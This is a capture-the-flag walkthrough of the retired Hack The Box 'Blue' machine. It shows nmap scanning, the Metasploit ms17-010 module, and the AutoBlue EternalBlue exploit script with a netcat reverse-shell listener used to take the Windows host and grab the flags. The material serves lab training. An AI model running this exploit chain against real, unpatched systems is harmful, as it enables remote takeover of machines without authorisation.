<h1>Blue</h1>

<h2>CONNECT</h2>
Connect to Starting Point VPN before starting the machine<br>
Using <code>openvpn</code> to operate the file of <code>download vpn</code> in kali.

<h2>SUBMIT FLAG</h2>
<h3>Method 1 - Metasploit</h3>
<code>Nmap</code> find three standard <code>Windows</code> ports in <code>135</code> (RPC), <code>139</code> (NetBios), and <code>445</code> (SMB).<br>
<b>command</b>：<code>nmap -p- -Pn &lt;ip&gt; --min-rate 5000</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Blue/blue/nmap.png" alt="nmap" width="80%">
<code>Nmap</code> has <code>vuln scripts</code> that will check for known vulnerabilities in service.<br>
<b>command</b>：<code>nmap --script=vuln -v -p &lt;port&gt;&lt;ip&gt;</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Blue/blue/vulnnmap.png" alt="vulnnmap" width="80%">
Because the vulnerable script scans out as ms17-010, use msfconsole: search ms17-010.<br>
<b>command</b>：<code>search ms17-010</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Blue/blue/search.png" alt="search" width="80%">
<code>show options</code>：Show module options<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Blue/blue/showoptions.png" alt="showoptions" width="80%">
<code>set</code> command to set parameters, and finally use <code>run</code> command to start the attack.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Blue/blue/set.png" alt="set" width="80%">
You can get flags after traveling through the directory and grab the flags.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Blue/blue/getflag.png" alt="getflag" width="60%">
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Blue/blue_shell/user.txt.png" alt="user.txt" width="60%">

<h2>SUBMIT FLAG</h2>
<h3>Method 2 - Shell</h3>
<b>command</b>：<code>git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
</code><br>
The <code>shell_prep.sh</code> script is used to generate the final payload.<br> 
What we need to do is specify the local host, local port and time of payload.<br> 
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Blue/blue_shell/shell_prep.png" alt="shell_prep" width="80%">
<b>command</b>：<code>python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_x64.bin</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Blue/blue_shell/sc_x64.png" alt="sc_x64" width="60%">
Set up a netcat listener to catch reverse shell when it is executed by the victim host.<br>
<pre text="class">
<b>nc parameter description</b>
-l：listen for incoming connections
-v：verbose output
-n：skip the DNS lookup
-p：specify the port to listen on
</pre>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Blue/blue_shell/nc_success.png" alt="nc_success" width="60%">
You can get two flags after traveling the directory！
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Blue/blue_shell/getflag1.png" alt="getflag1" width="60%">
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Blue/blue_shell/user.txt.png" alt="user.txt" width="60%">
